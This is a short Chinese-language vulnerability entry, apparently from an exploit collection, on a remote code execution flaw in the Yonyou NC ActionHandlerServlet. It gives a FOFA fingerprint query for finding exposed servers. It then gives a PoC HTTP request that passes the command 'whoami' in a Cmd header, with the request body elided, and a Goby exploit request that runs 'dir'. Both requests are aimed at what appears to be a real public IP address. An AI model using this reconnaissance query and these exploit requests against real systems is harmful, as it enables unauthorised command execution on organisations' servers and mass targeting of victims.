# 用友 NC ActionHandlerServlet 接口远程代码执行漏洞

    ## fofa

```
banner="nccloud" || header="nccloud" || (body="/platform/yonyou-yyy.js" && body="/platform/ca/nccsign.js") || body="window.location.href=\"platform/pub/welcome.do\";" || (body="UFIDA" && body="logo/images/") || body="logo/images/ufida_nc.png" || title="Yonyou NC" || body="<div id=\"nc_text\">" || body="<div id=\"nc_img\" onmouseover=\"overImage('nc');" || (title=="产品登录界面" && body="UFIDA NC") || body="../Client/Uclient/UClient.dmg"
```

## poc

```
POST /servlet/~ic/com.ufida.zior.console.ActionHandlerServlet HTTP/1.1
Host: 58.48.209.10:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cmd: whoami
Accept-Encoding: gzip
Content-Length: 3896

xxxxxxxxxx
```

## gobyexp

```
POST /api/v1/debugExp HTTP/1.1
Content-Type: application/json;charset=UTF-8
Authorization: Basic dXNlcjpwYXNz
host: 82.156.29.211:8365
Connection: close
Content-Length: 113

{"hostinfo":"http://58.48.209.10:8000","vulfile":"CVD-2023-2894.go","expparams":{"attackType":"cmd","cmd":"dir"}}
```
